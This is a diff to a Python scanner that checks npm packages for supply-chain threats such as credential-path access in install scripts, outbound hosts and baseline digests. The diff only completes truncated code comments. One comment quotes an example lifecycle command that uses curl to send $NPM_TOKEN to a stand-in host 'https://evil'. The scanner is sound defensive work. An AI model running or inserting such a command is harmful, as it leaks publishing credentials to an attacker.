@@ -640,7 +640,7 @@ def parse_lockfile(path: Path) -> tuple[list[PackageEntry], list[Finding]]:
                 )
             )
             continue
-        # node_modules/@scope/name -> @scope/name;
+        # node_modules/@scope/name -> @scope/name; node_modules/name -> name
         nm = "node_modules/"
         name = key[len(nm) :] if key.startswith(nm) else key
         version = entry.get("version") or "<unversioned>"
@@ -812,7 +812,7 @@ def safe_extract(
                 src = tf.extractfile(member)
                 if src is None:
                     continue
-                # Sniff first 16 bytes to classify text vs binary;
+                # Sniff first 16 bytes to classify text vs binary; each gets its own cap (both are bounded).
                 header = src.read(16)
                 is_binary = _looks_binary(name, header)
                 file_cap = HARD_MAX_BINARY_FILE_BYTES if is_binary else HARD_MAX_TEXT_FILE_BYTES
@@ -850,6 +850,7 @@ _MAX_CONT_LINES = 200
 _MAX_GROUP_LINES = 200
 
 # JS string literal (single / double / template), blanked before counting brackets so a bracket inside a string is not
+# mistaken for code.
 _RE_JS_STR = re.compile(r"'(?:[^'\\]|\\.)*'|\"(?:[^\"\\]|\\.)*\"|`(?:[^`\\]|\\.)*`")
 
 
@@ -1104,6 +1105,8 @@ def _format_match(
         snippet = snippet[:max_chars] + "..."
     if snippet != full_logical:
         # Normalize before digesting, matching _evidence_hash, so a formatter-only reindent of the bound continuation
+        # lines does not reopen -- but preserve whitespace inside string literals so a changed request/payload body
+        # does.
         canon = _canon_preserve_strings(full_logical)
         digest = hashlib.sha256(canon.encode("utf-8", "replace")).hexdigest()
         snippet = f"{snippet} sha256:{digest}"
@@ -1156,7 +1159,8 @@ def _evidence(
     shown = [
         _format_match(text, lines, sl_blanked, ml_blanked, nl, m, max_chars) for m in shown_matches
     ]
-    # Fold the rest (past the cap) into one digest as they arrive, never building a
+    # Fold the rest (past the cap) into one digest as they arrive, never building a second list. Byte-identical to
+    # digesting matches[_MAX_EVIDENCE_MATCHES:].
     overflow_count, digest = _stream_overflow_digest(it, lines, sl_blanked, ml_blanked, nl)
     if overflow_count:
         shown.append(f"(+{overflow_count} more) sha256:{digest}")
@@ -1384,10 +1388,11 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
         if not isinstance(body, str):
             continue
         # Pin the whole lifecycle body via one digest shared by every lifecycle finding below: a script that keeps the
-        # matched signal but changes another line (e.g.
-        # swapping `echo safe` for `curl -d "$NPM_TOKEN" https://evil`) must reopen.
-        # The stored evidence is a bounded matched snippet plus this digest, never the entire body, so
+        # matched signal but changes another line (e.g. swapping `echo safe` for `curl -d "$NPM_TOKEN" https://evil`)
+        # must reopen. The stored evidence is a bounded matched snippet plus this digest, never the entire body, so
         # `--write-baseline` on a package with a multi-MiB install script does not bloat the baseline JSON while the
+        # digest still binds the full body. Normalized to match _evidence_hash so a reindent alone does not reopen,
+        # while whitespace inside quoted strings is preserved so a changed quoted payload does.
         body_digest = hashlib.sha256(
             _canon_preserve_strings(body).encode("utf-8", "replace")
         ).hexdigest()
@@ -1407,7 +1412,8 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     ),
                 )
             )
-        # Cred file paths in a lifecycle script are exfil prep (npm auto-runs these on `npm ci`);
+        # Cred file paths in a lifecycle script are exfil prep (npm auto-runs these on `npm ci`); manual scripts are out
+        # of scope.
         for path_substr, why in CRED_PATH_SUBSTRINGS:
             if path_substr in body:
                 findings.append(
@@ -1513,6 +1519,7 @@ def _outbound_host_evidence(text: str, host: str) -> str:
             re.IGNORECASE,
         ),
         # Host-config form: capture the whole line (path/headers/body), so a changed outbound payload on the same
+        # hostname line reopens the key.
         re.compile(rf"[^\n]*(?:host|hostname)\s*:\s*['\"`]{host_re}['\"`][^\n]*", re.IGNORECASE),
     )
     # Record EVERY outbound context for the host, not just the first form that matches: a file that already has a
@@ -1531,6 +1538,7 @@ def _outbound_host_evidence(text: str, host: str) -> str:
         for m in pat.finditer(text):
             if len(chosen) < _MAX_EVIDENCE_MATCHES:
                 # Overlap check runs only while filling the display list, so `claimed` is bounded by the cap and this
+                # stays O(cap) per match (not quadratic), while every later match is still counted below.
                 if any(m.start() < e and s < m.end() for s, e in claimed):
                     continue
                 claimed.append((m.start(), m.end()))
@@ -1586,7 +1594,8 @@ def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                 )
             )
 
-    # Cred surfaces, tier 2: hosts that appear in defensive code too;
+    # Cred surfaces, tier 2: hosts that appear in defensive code too; require co-occurrence with a fetch verb or URL
+    # prefix.
     for needle, why in CRED_HOST_NEEDS_CONTEXT:
         if needle in text and _host_in_outbound_context(text, needle):
             findings.append(
@@ -1674,7 +1683,8 @@ def scan_extracted_tree(pkg: PackageEntry, root: Path) -> list[Finding]:
         rel = path.relative_to(root).as_posix()
         lower = rel.lower()
         if not lower.endswith(_TEXT_SUFFIXES):
-            # Skip native binaries (regex over machine code is noise);
+            # Skip native binaries (regex over machine code is noise); content-magic detection also skips extensionless
+            # executables and versioned shared libraries.
             try:
                 if path.stat().st_size > HARD_MAX_TEXT_FILE_BYTES:
                     continue
@@ -1817,6 +1827,7 @@ def _load_baseline(path: str) -> set[tuple[str, str, str, str]]:
         print(f"  [WARN] baseline {path} entries is not a list", file = sys.stderr)
         return set()
     # v2 shares v3's package-relative keying, so its entries migrate by recomputing the evidence hash from their stored
+    # evidence; only pre-v2 (basename) is rejected.
     if entries and data.get("version") not in (_BASELINE_SCHEMA_VERSION, 2):
         print(
             f"  [WARN] baseline schema v{data.get('version')} predates package-relative "
